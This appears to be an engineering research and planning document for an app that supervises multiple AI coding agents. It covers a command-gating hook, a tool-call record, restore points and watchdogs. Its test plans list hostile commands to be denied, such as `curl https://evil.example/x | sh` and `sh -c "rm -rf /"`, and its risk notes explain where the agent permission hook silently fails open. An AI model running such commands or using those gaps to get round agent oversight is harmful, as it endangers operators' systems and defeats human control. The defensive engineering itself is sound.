### Pattern 10 — VIGIL-04: stamp in the CLI, derive in the view

`HiveTask` (`hive.ts:119-152`) has `createdAt: string` at `:127` and no `updatedAt`. The convention to match is present three times: `HumanQA.askedAt`/`answeredAt`/`dismissedAt` (`hive.ts:111-117`) and `HiveTask.review.askedAt` (`:147`).

**Stamp at the one sanctioned writer.** `TASK_CLI` is `hiveTemplates.ts:24`, written by `hive.writeIfChanged(join(root,'bin','task.cjs'), TASK_CLI)` at `hive.ts:807`. Every `add|patch|claim|done` goes through it under the `tasks.lock` CAS. **But note:** `hive.ts:2110-2140` also mutates the ledger from main (the kanban UI, inbound webhooks and Slack all write through `HiveManager`, per the god prompt at `hive.ts:1471`), so a `TASK_CLI`-only stamp leaves UI edits unstamped. **Both writers must stamp**, or "nine hours in `doing`" is measured from the wrong clock exactly when a human touched the card.

`askedAt` is already parsed at `TasksKanban.tsx:100` and already emitted by `openPhoneAsks` at `index.ts:1233`, so VIGIL-04's ASK-ME half is render-only, as D-31 says.

---

## Don't Hand-Roll

| Problem | Don't build | Use instead | Why |
|---|---|---|---|
| Snapshotting the operator's repo | A copier + a dedup layer + a manifest | `git --git-dir=<store> --work-tree=<repo>` | Content-addressed dedup, `.gitignore` honoured, per-file restore, all free — **measured in §Pattern 6** |
| Serializing snapshot writes | A new mutex | `gitCommitter`'s debounce + `committing` flag + `STALE_LOCK_MS` (`gitCommitter.ts:76-79`, `:168-171`) | The stale-lock recovery is the part that is hard, and it is already written |
| A durable tool-call store | A JSONL with a rotate policy | `PersistStore` migration index 2 | D-16; and a rotate policy is the bug RECORD-02 exists to fix |
| Asking the operator on their phone | Any endpoint | `openAsks()` + `GET /phone/api/asks` (`webhook.ts:633`) | Bearer-in-header, byte-identical auth failures, phone-specific rate bucket, lockout, body cap — all finished and tested in Phase 2 |
| Reaching a closed phone | Any push service | `src/main/push.ts` (293 lines, VAPID from `node:crypto`, injected transport) | Zero recurring cost; unit-tests with no network |
| Tokenizing a shell command | A new splitter | `hooks.ts:885-889`'s `expandHiveVars` + `.split(/[\s;&|<>()"']+/)` | Its cost is already measured (2612 words → 102 candidates) and its ceiling is already written down |
| The deny wire format | A new response shape | `boundDeny(reason)` (`hooks.ts:468-474`) | Declared once *specifically* "so the exits cannot drift apart" |
| Per-PTY silence | A new timestamp | `PtyManager.idleFor(id)` (`pty.ts:940-945`) | D-24 |
| Off-screen terminal bytes | A renderer bridge | `PtyManager.outputTail(id)` (`pty.ts:930`) | 256 KiB main-side ring that fills unmounted, already |
| A "told once" latch | A new state machine | `DeliveryService.quiesced: Set<string>` (`delivery.ts:270`, pruned `:733`) | Same edge-trigger-and-clear shape, already in the same process |

**Key insight:** every single one of Phase 4's eleven requirements has a *majority* of its mechanism already in this repo. The phase's real difficulty is not building things — it is **slicing eleven requirements across six shared files with `use_worktrees: false`**, and being honest about the five engines nobody can install.

---

## Sequencing Constraints

Dependencies that are real, with the reason each one is real.

**S-1 — GATE-03 before GATE-05, same owner.** `hooks.ts:1368-1399` and `control.ts:97` are edited by both (D-01). GATE-05's third answer is a *third return value from the judge GATE-03 builds*; there is nowhere for "ask" to hang until "deny for this shape" exists. **Slice as one plan, or two plans in strict sequence with one owner of `hooks.ts` + `control.ts`.**

**S-2 — GATE-03's shim changes before GATE-05's poll loop.** The `hive_ask` reply is only useful once `HOOK_SHIM` (`hiveTemplates.ts:298`), `GROK_HOOK_SHIM` (`:730`) and `AGY_HOOK_SHIM` (`:364`) can poll. All three live in **one file**, so they are one owner regardless. Note `gitCommitter.ts:240` byte-compares `bin/cth-hook.cjs` against the `HOOK_SHIM` constant — changing the constant is fine (`hive.ts:801` rewrites the file every bootstrap) but the two must land in the same commit or the secret-scrub sees a mismatch.

**S-3 — RECORD-01's `tool_calls` table before VIGIL-01's counters, *if* the watchdog reads it.** If VIGIL-01 derives "no card advances / no mail routes" from `hive.tasks()` + `appendLog` instead (which it can — see Pattern 7), this dependency dissolves. **Recommend dissolving it**: it buys the two tracks independence at no cost.

**S-4 — RECORD-01 and RECORD-02 share `db.ts`'s `MIGRATIONS` array.** Two plans appending migrations concurrently produce two `MIGRATIONS[2]`s and a merge conflict *plus* a version skew on any dev machine that ran one of them. **One owner of `db.ts` for the whole phase.** Both tables in one migration is the lazy and correct answer.

**S-5 — VIGIL-04's `updatedAt` before VIGIL-01's "no card advances", *if* VIGIL-01 reads it.** Same dissolution available: VIGIL-01 can read the ledger's `rev` (`hive.ts:2118-2123` bumps it on every mutation) instead of a per-card timestamp. **Recommend `rev`** — it is one integer, it already exists, and it is exactly "did the ledger change".

**S-6 — VIGIL-03's `blocked` plumbing before its detection.** Guard first (`delivery.ts:740`, two lines, testable with a fake), detector second (`pty.ts:826` or a poll). Reversed, the detector has nothing to feed and the guard's test cannot be written.

**S-7 — GATE-02 last within the GATE track, or first, but never in the middle.** Stripping the env is the single most likely way to break a working floor (D-13). It must be the change that a live smoke test immediately follows. If it lands mid-wave, every subsequent failure in that wave is ambiguous.

**S-8 — Anything adding a `LIVE-UNVERIFIED` marker contends for `test/repo-claims.test.cjs`.** Measured: `MARKER_LEDGER` (`test/repo-claims.test.cjs:1291-1298`) pins **exact per-file counts**, a repo-wide total (`:1299-1302`), a per-engine lower bound (`:1453`) and a committed **file-set** assertion (`:1422`). At `ad3d2f7` it is `{hive.ts:3, hiveProvisioning.ts:5, hiveTemplates.ts:3, index.ts:1, webhook.ts:3, agentProvider.ts:3}` = 18, and it matches reality exactly. **GATE-03's pi/OpenCode markers and GATE-04's codex-sandbox marker each require editing this ledger in the same commit.** With `use_worktrees: false`, that makes `test/repo-claims.test.cjs` a phase-wide single-owner file, or it makes those three changes one plan.

**S-9 — Nothing blocks on anything outside the phase.** 02-12 has landed (`8e85748`); Phase 1's GATE-01 and Phase 2's DAEMON-01/02, GSD-06 and STRUCT-01 are all present and were read in this session.

**A slicing that satisfies all of the above:**

| Track | Owns (exclusively) | Requirements |
|---|---|---|
| **A — the gate** | `hooks.ts`, `control.ts`, `hiveTemplates.ts`, `hiveProvisioning.ts`, `webhook.ts`, `push.ts`, new `commandShape.ts`, new `approvals.ts` | GATE-03, GATE-05 |
| **B — the env + the sandbox** | `pty.ts`, `shellEnv.ts`, `agentProvider.ts`, `config.ts`, `renderer/store/config.ts` | GATE-02, GATE-04 |
| **C — the record** | `db.ts`, `telemetry.ts`, `git.ts`, `gitCommitter.ts`, new `restorePoints.ts` | RECORD-01, RECORD-02, RECORD-05 |
| **D — absence** | `delivery.ts`, `floor/lifecycle.ts`, `floor/boot.ts`, `usePtyParser.ts`, `useHive.ts`, `TasksKanban.tsx` | VIGIL-01, VIGIL-02, VIGIL-03, VIGIL-04 |
| **shared, needs a rule** | `hive.ts` (C wants `appendLog`, D wants `HiveTask`), `index.ts` (A wants `openPhoneAsks`, D wants the watchdog wiring), `test/repo-claims.test.cjs` (A and B) | — |

Three files cannot be given one owner without serializing tracks. Either sequence the waves so each file has one owner *per wave*, or split by function: `hive.ts`'s `HiveTask`+`TASK_CLI` region (D) is ~40 lines away from its `appendLog` region (C), and `index.ts`'s `openPhoneAsks` (`:1221`) is 3,500 lines from where a watchdog would wire in. Per-wave ownership is the cleaner reading of D-35.

---

## Risks and Landmines

Each grounded in a file:line opened, or a command run, in this session.

**L-01 — `protectedPathDenial` returns `null` before any command judging, for the two commands GATE-03 cares most about.** `hooks.ts:890`: `if (targets.length === 0) return null;`. `curl https://evil.example/x | sh` contains no `pathShaped` word (`hooks.ts:299`), so the function exits before the candidate loop. **GATE-03's shape judge must run independently of, and ideally before, `protectedPathDenial` — not "inside" it.** A plan that reads D-02 as "add a branch to `protectedPathDenial`" ships a gate that never sees two of the four shapes.

**L-02 — a held-open connection is a silent fail-open on grok and agy.** `GROK_HOOK_SHIM` runs `JSON.parse(resp || '{}')` over the **whole** accumulated buffer at `hiveTemplates.ts:772`; on a parse failure it sets `out = null` and `process.exit(0)` with no stdout — which is *allow*. Two JSON objects concatenated on one connection is a parse failure. `AGY_HOOK_SHIM` has the same shape. **This is why Pattern 3 polls instead of streaming.** A GATE-05 implementation that writes a pending preamble on the live connection will pass every Claude test and silently allow on grok and agy.

**L-03 — `db.ts` and `hooks.ts` are NOT electron-free**, contrary to `04-CONTEXT.md`'s `<code_context>` claim. `db.ts:19` is `import { app } from 'electron'`; `hooks.ts` imports `WebContents` and uses `Notification` as a value (which is precisely why `test/boot-floor.test.cjs:52` stubs `Notification`). Any new module RECORD-01 or GATE-05 adds should genuinely be electron-free — but a plan that assumes it can `require('../src/main/db.ts')` in a bare test without `test/load-ts.cjs`'s stub or a `require.cache` injection will fail on all three CI runners, which install with `npm ci --ignore-scripts` (`ci.yml:88`) and therefore have no electron binary at all.

**L-04 — GATE-02's env allowlist will log Crush out, and possibly others.** `hiveProvisioning.ts:373` states verbatim: *"Keys ride BYOK env vars (Crush reads `ANTHROPIC_API_KEY`/`OPENAI_API_KEY`/… directly), so none are written here."* Keys the operator configured **in the app** are injected into `opts.env` at `index.ts:2301-2307` and survive the base filter; keys the operator **exported in their shell** do not. This is D-13's hazard with a name and a line number. The additive pass-through list is not optional polish — it is the thing that keeps a BYOK operator working.

**L-05 — the telemetry ring cannot supply RECORD-01's `target` and never could.** `ToolSpan` has no such field (`telemetry.ts:97-107`); `ATTR_ALLOWLIST` (`telemetry.ts:676-680`) admits no path or command key; and the whole OTel path is `if (claudeProvider && …)` (`hive.ts:1122`). A plan that implements D-17 literally — "persist at the point the span is recorded" — ships a Claude-only record with a null target and passes its own unit test.

**L-06 — one `git init` in a subdirectory kills the entire restore point.** Measured: with an uncommitted embedded repo present, `git add -A` prints `error: 'nested_empty/' does not have a commit checked out; fatal: adding files failed` and **exits 128**, adding nothing. With `--ignore-errors` it exits 1 and still skips it. And an embedded repo *with* commits is worse in a quieter way: it is recorded as a **gitlink, mode `160000`** (measured: `160000 5cfa59e… 0 nested_committed`), so the restore point claims to contain that whole subtree and contains none of its objects. **This is not hypothetical for this project** — agents create git worktrees inside the operator's repo (`worktreePaths`, `git.ts:518 listWorktrees`), and this very research session is running inside `.claude/worktrees/gsd-plan-phase-04`. **Mitigation, measured working:** discover nested `.git` entries (`find <repo> -mindepth 2 -name .git`) and write them into `<store>/info/exclude` — which lives in the *shadow* store and touches nothing of the operator's. After doing that, `add -A` exited **0** and produced a clean single-file snapshot.

**L-07 — `restore.git/index.lock` contention is fatal, not retried.** Measured: two concurrent `add -A` against the same store → `fatal: Unable to create '…/restore.git/index.lock': File exists.` The snapshot writer needs the same single-writer discipline ADR-0004 gives the hive repo — `gitCommitter.ts`'s `committing` flag (`:171`), trailing debounce (`:168`) and `STALE_LOCK_MS = 60_000` stale-lock recovery (`:79`). Note ADR-0004's rule is about the *hive* repo; RECORD-05 needs the same *mechanism* for a different repo, which is a copy, not a reuse.

**L-08 — GATE-04's flag has two splice sites that must agree.** The auto-mode flag is appended to the command string in **main** at `config.ts:1067` (`commandForAutoMode`) and independently in the **renderer** at `renderer/src/store/config.ts:430` (`if (config.autoMode && preset.autoFlag) cmd = \`${cmd} ${preset.autoFlag}\``). A sandbox opt-in that changes only one produces a command the operator sees in `AddAgentModal.tsx:971` that is not the command that spawns. Both files, one wave, one owner — and they sit in different tsconfig projects (`tsconfig.node.json` / `tsconfig.web.json`), so typecheck will not catch the drift.

**L-09 — VIGIL-02's "where their branch is" is not synchronously available.** `worktreeHasUnintegratedWork` is `async` and shells git (`git.ts:334`, `git.ts:10`); it is reached only inside `finalizeAgentWorktree`, which `teardownPty` fires with `void` at `lifecycle.ts:247`. Two ways out, both acceptable: (a) release the card synchronously at `:233` naming only *who* dropped it, then patch the branch detail from `finalizeAgentWorktree`'s continuation (`:200-211`) a moment later — two ledger writes, both through `bin/task.cjs`, and the minute budget is met by the first; (b) release the card from inside `finalizeAgentWorktree` — one write, but it inherits that function's `try/catch` (`:212`) which currently swallows and logs, so a git failure would silently mean no card release. **(a) is the ADR-0003-shaped choice**: release first, enrich later, never lose the release to a git error.

**L-10 — `test/repo-claims.test.cjs`'s marker ledger is a hard, exact, four-way pin.** See S-8. It is currently correct (re-measured: 18 markers, ledger matches). Three of this phase's likely changes add markers.

**L-11 — codex's Windows sandbox has an OPEN upstream defect on exactly the mechanism GATE-04 plans to use.** [CITED: github.com/openai/codex/issues/23552] — *"workspace-write writable_roots still prompts for approval on listed Windows directories"*, state **OPEN**, opened 2026-05-19, against `codex-cli 0.130.0-alpha.5`. This machine runs 0.128.0, so it may or may not reproduce here — **that is a Wave-0 spike, not an assumption to carry.** Mitigating discovery: `codex --help` on this machine shows **`--add-dir <DIR>` — "Additional directories that should be writable alongside the primary workspace"**, a *flag*-level path to the same outcome that does not go through `config.toml` at all, and which the floor can splice exactly where `autoModeFlag` is spliced today. Try `--add-dir` first.

**L-12 — the phone PWA is hand-written, not built, and its service worker holds `taskId`.** `resources/phone/index.html` (20 KB) contains `taskId` **21** times and `askedAt` 4 times; `resources/phone/sw.js` contains `taskId` **10** times. Renaming `PhoneAsk.taskId` to an ask id touches both, and `sw.js` is *installed on the operator's phone* and updates on its own schedule — a mismatched SW is a live-device failure with no local reproduction. **Take D-10's own escape hatch:** add `kind: 'card' | 'tool'` and keep the wire field named `taskId`, carrying the ask id for tool approvals. Zero PWA edits. `[VERIFIED: file inspection]`.

**L-13 — `env` name casing on win32.** `process.env` on Windows is case-insensitive to the OS but the object's keys are whatever the OS gave them; a `Set<string>.has('PATH')` misses a machine that reports `Path`. Measured on this machine: 114 vars, `PATH` uppercase — but that is one machine. Normalize with `toUpperCase()` on both sides of the comparison, or the allowlist silently strips `PATH` for some operator and every agent dies with ENOENT.

---

## Common Pitfalls

**Pitfall 1 — marking a gate green on a test that could never have failed.**
*What goes wrong:* a repo-fact assertion greps for a string, the formatter later wraps the construct, and the assertion silently matches nothing forever.
*Why it happens:* single-line greps and negative-only assertions.
*How to avoid:* D-33/D-40, and the model is in the tree — `test/repo-claims.test.cjs` reads stripped-of-comments text for most clauses and **raw** text for the marker clause specifically (`:1249-1262` explains exactly why), and pins **both** directions plus a positive lower bound.
*Warning signs:* an assertion whose failure mode is "found 0" rather than "found the wrong thing".

**Pitfall 2 — testing the half, not the loop.**
*What goes wrong:* `test/net-binding.test.cjs` proved the server rejects a tokenless payload and `test/hive-hook-node.test.cjs` proved the shim sends bytes; both passed while the whole floor was dead-hooked.
*Why it happens:* each half is easier to test than the join.
*How to avoid:* `test/hook-auth-roundtrip.test.cjs:95` is the model — drive the **real shim** as a child process into the **real `HookServer`**. GATE-05's bounded wait must be tested this way or the poll loop is unverified.
*Warning signs:* a test that constructs a payload by hand rather than letting the shim build it.

**Pitfall 3 — a Windows named pipe has no filesystem entry.**
*What goes wrong:* a test `stat`s the socket path; on win32 `sockPath()` is a `\\.\pipe\` name and there is nothing to stat.
*How to avoid:* `test/boot-floor.test.cjs:183` says it in a comment — *"Connect, never stat"*. `armSocketWatchdog` returns early on win32 for the same reason (`hooks.ts:653`).
*Warning signs:* `existsSync(sock)` anywhere in a new test.

**Pitfall 4 — assuming `git status` is read-only.**
*What goes wrong:* an assertion compares `.git/index` mtime before and after and finds it changed.
*Measured:* it changed in probe 1 step 4 — because `git status` refreshes the stat cache and rewrites the index when working-tree files have changed. **That is the operator's own `git status` doing it, not the shadow store.** D-22's test must compare `git status --porcelain` **output** and `git rev-parse HEAD`, not index mtimes.

**Pitfall 5 — `synchronous = NORMAL` is not `FULL`.**
*What goes wrong:* "the record survives the crash" is tested by `process.exit()` immediately after an insert, and the row is there — because it is in the WAL — and the plan concludes durability is proven.
*Why it matters:* `db.ts:139` sets `synchronous = NORMAL`, which under WAL means a row survives a **process** crash but is not guaranteed against an **OS/power** loss until a checkpoint. That is the right trade for this app and it should be *stated*, not silently upgraded to `FULL` (which would fsync on every tool call).
*How to avoid:* test the crash the requirement names — kill the app process and reopen — and write the OS-crash gap into the ceiling.

**Pitfall 6 — flipping the shim's 5 s timeout to deny.**
*What goes wrong:* every socket outage, app restart and legitimately-not-running floor denies every tool call on every agent.
*Why it happens:* it looks like the obvious way to make the wait fail closed.
*How to avoid:* D-08's clause 3 and `hooks.ts:440-445`'s own reasoning. The connect-error path (`c.on('error', () => process.exit(0))`) is what makes "the floor is down" allow, and it fires **before** any ask exists.

**Pitfall 7 — assuming `--work-tree` needs `GIT_INDEX_FILE`.**
Measured: it does not. `--git-dir=<store>` alone makes the index default to `<store>/index`. Setting `GIT_INDEX_FILE` too is harmless belt-and-braces; requiring it complicates the runner for nothing. Related: `git.ts`'s `runGit` (`git.ts:6-28`) takes **no env parameter** — so if the planner does want `GIT_INDEX_FILE`, `runGit` must grow one. With `--git-dir` alone, it needs no change at all beyond a `cwd` that exists.

---

## Code Examples

### Extending `db.ts`'s migration array (RECORD-01 + RECORD-02, one migration)

```ts
// src/main/db.ts — APPEND to MIGRATIONS (currently 2 entries, db.ts:63-107).
// Index 2 → user_version 3. NEVER edit a shipped migration (db.ts:41-43).
  // → user_version 3 (RECORD-01/RECORD-02): the durable record.
  (db) => {
    db.exec(`
      CREATE TABLE IF NOT EXISTS tool_calls (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id TEXT    NOT NULL,
        ts       INTEGER NOT NULL,
        tool     TEXT    NOT NULL,
        target   TEXT,
        decision TEXT,
        reason   TEXT
      );
      CREATE INDEX IF NOT EXISTS idx_tc_agent_ts ON tool_calls(agent_id, ts DESC);
      CREATE INDEX IF NOT EXISTS idx_tc_ts       ON tool_calls(ts);
      CREATE TABLE IF NOT EXISTS events (
        id   INTEGER PRIMARY KEY AUTOINCREMENT,
        ts   INTEGER NOT NULL,
        kind TEXT    NOT NULL,
        json TEXT    NOT NULL
      );
      CREATE INDEX IF NOT EXISTS idx_ev_ts      ON events(ts);
      CREATE INDEX IF NOT EXISTS idx_ev_kind_ts ON events(kind, ts);
    `);
  }
```

### Verifying the migration ran (the `boot-floor` liveness style)

```js
// Modelled on test/boot-floor.test.cjs:190-196 — a liveness assertion, never
// "the promise resolved". A DIRECT dbPath keeps electron out of the runtime path
// (db.ts:129 only calls app.getPath when dbPath is undefined).
const { PersistStore } = loadTs('src/main/db.ts');
const s = new PersistStore(path.join(tmp, 'harness.db'));
s.open();
s.recordToolCall({ agentId: 'bob', tool: 'Bash', target: 'rm -rf /' });
s.close();                                   // checkpoints WAL — the "crash" boundary
const s2 = new PersistStore(path.join(tmp, 'harness.db'));
s2.open();
const rows = s2.toolCalls('bob');
assert.equal(rows.length, 1, 'the record did not survive a close/reopen');
assert.equal(rows[0].target, 'rm -rf /', 'the TARGET is the half RECORD-01 exists for');
```

### RECORD-05's runner, with the nested-repo guard the probe proved necessary

```ts
// src/main/restorePoints.ts (new, electron-free)
const GIT_CFG = [
  '-c', 'core.autocrlf=false',    // measured: preserves bytes both directions on win32
  '-c', 'core.safecrlf=false',
  '-c', 'core.longpaths=true',
  '-c', 'user.email=hive@local',
  '-c', 'user.name=hive'
];
const base = (store: string, repo: string) => ['--git-dir', store, '--work-tree', repo, ...GIT_CFG];

// L-06: one `git init` in a subdirectory exits 128 and adds NOTHING.
// Excluding it in the SHADOW store's info/exclude touches nothing of the operator's.
function refreshNestedExcludes(store: string, repo: string): void {
  const nested = findNestedGitDirs(repo);                    // bounded walk, skips .git itself
  mkdirSync(join(store, 'info'), { recursive: true });
  writeFileSync(join(store, 'info', 'exclude'),
    nested.map((rel) => `${rel}/`).join('\n') + '\n', 'utf8');
}
```

### The GATE-05 ask reply that is simultaneously an old-shim deny

```ts
// src/main/hooks.ts — returned from handle() for the ask case. Synchronous.
// An old shim reads hookSpecificOutput and denies (fail-CLOSED, correct side).
// A new shim reads hive_ask and polls. No version negotiation anywhere.
return {
  hookSpecificOutput: {
    hookEventName: 'PreToolUse',
    permissionDecision: 'deny',
    permissionDecisionReason:
      `Approval required: ${reason}. This shim cannot wait for an answer, so the call is denied.`
  },
  hive_ask: { id: askId, deadlineMs: Date.now() + ASK_TTL_MS, pollMs: 1_000 }
};
```

---

## State of the Art

| Old approach (in this repo) | Current approach (this phase) | Why it changed |
|---|---|---|
| `AGENT_DENY_RULES` prefix matches in Claude's settings file (`hiveProvisioning.ts:63`) | Main-side tokenized judging at the hook choke point | The list "does not exist for the agy/codex/grok engines that reuse this very shim" — `hooks.ts:788-793` |
| Spans in a 200-entry volatile ring (`telemetry.ts:161`) | A SQLite row per tool call, written from the hook payload | "Thinnest exactly after a crash", and the ring has no target field |
| 8 MiB rotate keeping one generation (`hive.ts:2494`) | A retention **query bound** over an indexed table | "Keeps recent history without a retention policy" — its own comment concedes it |
| Blocked-detection in `usePtyParser` (renderer) | Detection in main off `proc.onData`/`outputTail` | Phase 2 shipped a headless floor (`floor/headless.ts`); a renderer parser does not exist there |
| Quiesce in `useHive.ts` effect 2e (renderer) | `DeliveryService.quiesce` in main (`delivery.ts:713`) — **already done in Phase 2** | Ran not at all with the window closed |
| Codex with `--dangerously-bypass-approvals-and-sandbox` (`agentProvider.ts:271`) | `-s workspace-write` + `--add-dir <agentDir>` | "A path-tree problem, not a security judgement" — `agentProvider.ts:262-270` |

**Deprecated / superseded in the upstream tooling:**
- codex `-a on-failure` is marked **DEPRECATED** in `codex --help` on 0.128.0 — "Prefer `on-request` for interactive runs or `never` for non-interactive runs."
- codex has **two permission models in flight** on 0.128.0: the documented `sandbox_mode` + `[sandbox_workspace_write]` used by `codex`/`codex exec`, and a newer `[permissions]` / `--permissions-profile` model that `codex sandbox <os>` **requires** (measured: `Error: default_permissions requires a '[permissions]' table`). GATE-04 should target the former — it is what the floor's spawn path uses and what the docs describe.

---

## Runtime State Inventory

Phase 4 is not a rename, but it does move storage and add on-disk state. Each category answered explicitly.

| Category | Items found | Action required |
|---|---|---|
| **Stored data** | `harness.db` at `app.getPath('userData')/harness.db` (`db.ts:129`) gains two tables via `user_version` 2→3. Existing installs migrate on next `open()` (`db.ts:148-158`, transactional per migration). | Code edit only — the migration IS the data migration. No backfill: `tool_calls`/`events` start empty and that is correct (the record begins when the writer does). |
| **Live service config** | None. The floor talks to no external service that stores Phase-4 state. The Cloudflare tunnel and webhook endpoints are Phase 2's and are untouched. | None — verified by grep: no Phase-4 mechanism writes outside `userData` or the hive root. |
| **OS-registered state** | None. No scheduled task, no service, no launch agent. VIGIL-01's watchdog is an in-process `setInterval` registered in `bootFloor` and cleared in `shutdown`. | None — but **the timer must be added to `SHUTDOWN_STEPS`** or `Floor.shutdown`'s "exact inverse of construction, ONE list" invariant (`boot.ts:120-123`) is broken and the boot test's fifth assertion is the one that catches it. |
| **Secrets / env vars** | GATE-02 changes **which** env names reach a child, not any secret's name or value. `HIVE_SOCK_TOKEN` (`pty.ts:775`) and the OTLP header pair are set after the spread and are unaffected. **But** operator-exported BYOK keys stop reaching Crush and any engine that reads them from the shell (L-04). | Ship the additive pass-through config key **in the same change**, and document it in `SECURITY.md` (which D-34 requires updating anyway). |
| **Build artifacts / on-disk state** | New: `<hive>/restore.git/` (RECORD-05). Its objects are *the operator's own source*, so it is content the hive repo must never swallow. `resources/phone/sw.js` is installed on operators' phones and must not be broken by a `PhoneAsk` field rename (L-12). | Add `restore.git` to `UNTRACK_PATHS` (`gitCommitter.ts:82`) **and** `restore.git/` to the ignore seed (`hive.ts:782-792`). Keep `PhoneAsk.taskId`'s name. |

---

## Environment Availability

Probed in this session on the target machine (Windows 11, `E:\munder-difflin\.claude\worktrees\gsd-plan-phase-04`).

| Dependency | Required by | Available | Version | Fallback |
|---|---|---|---|---|
| `git` | RECORD-05 | **✓** | 2.52.0.windows.1 | — |
| `node` (local) | tests, all | **✓** | v24.13.0 | — |
| `node` (CI) | tests | **✓** | 22 (`ci.yml:15`) | — |
| `better-sqlite3` | RECORD-01/02 | **✓** loaded & queried | 13.0.3 / SQLite 3.53.4 | — |
| `codex` CLI | GATE-03 live, GATE-04 | **✓ and authenticated** | codex-cli 0.128.0, "Logged in using ChatGPT" | — |
| `claude` CLI | GATE-03 live | **✓** | 2.1.236 | — |
| `grok` CLI | GATE-03 criterion 1 | **✗** | — | **None.** Build + unit-verify through the real `HookServer`; mark `LIVE-UNVERIFIED` |
| `pi` CLI | GATE-03 criterion 1 | **✗** | — | **None.** Same, plus D-06's own `LIVE-UNVERIFIED` disposition |
| `opencode` CLI | GATE-03 criterion 1 | **✗** | — | **None.** D-06 already rules this a first-class outcome |
| `kimi` / `agy` / `crush` / `qwen` CLIs | wider GATE-03 reach | **✗** | — | Same |
| `copilot` CLI | — | **✗** (stub present, reports missing) | — | Not needed |
| Electron binary | any main-module test | **✗ in CI by design** (`npm ci --ignore-scripts`, `ci.yml:88`) | — | `test/load-ts.cjs`'s stub, or `require.cache` injection (`boot-floor.test.cjs:33-56`) |
| A physical Android device | GATE-05 phone approval | **✗** | — | **None** — Deferred list already records this as a first-class outcome |

**Missing dependencies with no fallback (blocking a *claim*, not the *build*):**
- grok, pi and OpenCode CLIs. GATE-03's criterion 1 names all four engines; **only Codex can be live-verified here.** This is the single most important thing for the planner to price into the success criteria, and it is a claim-shaping fact, not a build blocker — the code for all seven bridges can be written and unit-verified through the real `HookServer`.

**Missing dependencies with a fallback:**
- The Electron binary: every existing main-process test already works around it, and the workaround is documented at `test/load-ts.cjs:11-27`.

---

## Validation Architecture

> `workflow.nyquist_validation` is `true` in `.planning/config.json`. This section is mandatory and is the input for VALIDATION.md.

### Test framework

| Property | Value |
|---|---|
| Framework | `node:test` (Node's builtin runner) + `node:assert/strict` |
| Config file | none — the runner is invoked directly |
| Loader | `test/load-ts.cjs` — TypeScript transpile + electron stub (`:46-64`) |
| Quick run command | `node --test test/<one>.test.cjs` (≈ 0.5–4 s) |
| Full suite command | `npm test` → `node --test test/*.test.cjs` |
| Measured baseline @ `ad3d2f7` | **805 tests / 798 pass / 0 fail / 7 skipped / 23.7 s** |
| Typecheck | `npm run typecheck` (both projects) — **0 errors** |
| Lint | `npm run lint` → `eslint . --max-warnings 0` |
| CI gates | `ci.yml:62` matrix `[ubuntu-latest, windows-latest, macos-latest]`, **no `continue-on-error`** on the test job (`ci.yml:63`) |
| Skip mechanism | `{ skip: !POSIX }` — 4 files carry POSIX-only tests; those 7 skips are win32 |

### Phase requirements → test map

| Req | Behaviour that must be true | Type | Automated command | Signal | What its ABSENCE looks like | File exists? |
|---|---|---|---|---|---|---|
| **GATE-02** | The allowlist keeps hive vars and drops secret-shaped names | unit | `node --test test/pty-env-allowlist.test.cjs` | Pure filter over a fixture env: `HIVE_ROOT`/`AGENT_ID`/`PATH` **present** (positive lower bound, D-12) **and** `AWS_SECRET_ACCESS_KEY`/`GH_TOKEN`/`ANTHROPIC_API_KEY` absent | Only the negative asserted → passes against a filter that returns `{}` | ❌ **Wave 0** |
| **GATE-02** | A real PTY's `env` shows the same | integration | `node --test test/pty-sanitize.test.cjs` (extend) | Spawn a PTY running `env`/`set`, parse the output tail via `outputTail()`, assert both directions | Asserting only absence passes against a PTY that never spawned (D-12 says this verbatim) | ✅ extend `test/pty-sanitize.test.cjs` |
| **GATE-03** | Each of the four shapes is denied on tokens | unit | `node --test test/command-shape.test.cjs` | `commandShapeDenial(tokens, allowlist)` returns a non-null reason for `sh -c "rm -rf /"`, `git push origin +main`, `curl … \| sh`, `curl https://evil.example`; **and null** for `rm README.md`, `git push origin main`, `curl https://registry.npmjs.org/x -o y` | A test with only deny cases passes against a function that returns a string unconditionally | ❌ **Wave 0** |
| **GATE-03** | The deny reaches an engine, over the real socket | integration | `node --test test/gate03-roundtrip.test.cjs` | Model on `test/hook-auth-roundtrip.test.cjs:95`: real `HOOK_SHIM` child → real `HookServer` → assert the child's **stdout** contains `permissionDecision":"deny"` and its exit code is 0 | A test that calls `handle()` directly proves the judge and not the loop (Pitfall 2) | ❌ **Wave 0** (POSIX-only; `{ skip: !POSIX }`) |
| **GATE-03** | Grok's translator maps the deny | unit | `node --test test/engine-parity.test.cjs` (extend) | Feed `GROK_HOOK_SHIM`'s `done()` logic a deny reply, assert `{decision:'deny'}` on stdout | — | ✅ extend |
| **GATE-03** | The empty allowlist fails **closed** | unit | same as row 3 | `commandShapeDenial(['curl','https://x/y'], [])` returns a reason **naming the empty config** | Returning null → the D-05 fail-open, silently | ❌ Wave 0 |
| **GATE-04** | Codex spawns with the sandbox on and still writes its agent dir | manual + unit | unit: `node --test test/agent-provider.test.cjs` (extend) for the argv; manual: a live codex agent completes a task, mails, writes `memory.md` | argv contains `-s workspace-write` and `--add-dir <agentDir>`; **no write refused** in the live run | argv asserted but never spawned = the GATE-01-shaped failure this project names | ✅ extend + **operator live run** |
| **GATE-04** | The fallback to today's behaviour is verified | unit | same | With the opt-in off, argv is **byte-identical** to `ad3d2f7`'s | — | ✅ extend |
| **GATE-05** | An unanswered ask denies at the deadline | integration | `node --test test/gate05-bounded-wait.test.cjs` | Real shim child + real server + an injected clock: no answer → child stdout carries a deny, exit 0, **within** `deadlineMs + pollMs` | A test that asserts only "the registry expired" never proves the shim wrote a deny — and a silent exit is *allow* | ❌ **Wave 0** (POSIX-only) |
| **GATE-05** | An explicit yes allows | integration | same file | `answerAsk(askId,'yes')` mid-wait → child stdout is `{}` (or empty) and exit 0 | — | ❌ Wave 0 |
| **GATE-05** | A dead socket still allows (D-08 clause 3) | integration | same file | Server stopped → child exits 0 with **no** stdout | If this goes red, the fail-open D-07 deliberately preserves has been destroyed | ❌ Wave 0 |
| **GATE-05** | The ask appears on the phone list | unit | `node --test test/webhook-endpoints.test.cjs` (extend) | `GET /phone/api/asks` includes the pending approval with `kind:'tool'`; `POST /phone/api/answer` resolves it | — | ✅ extend |
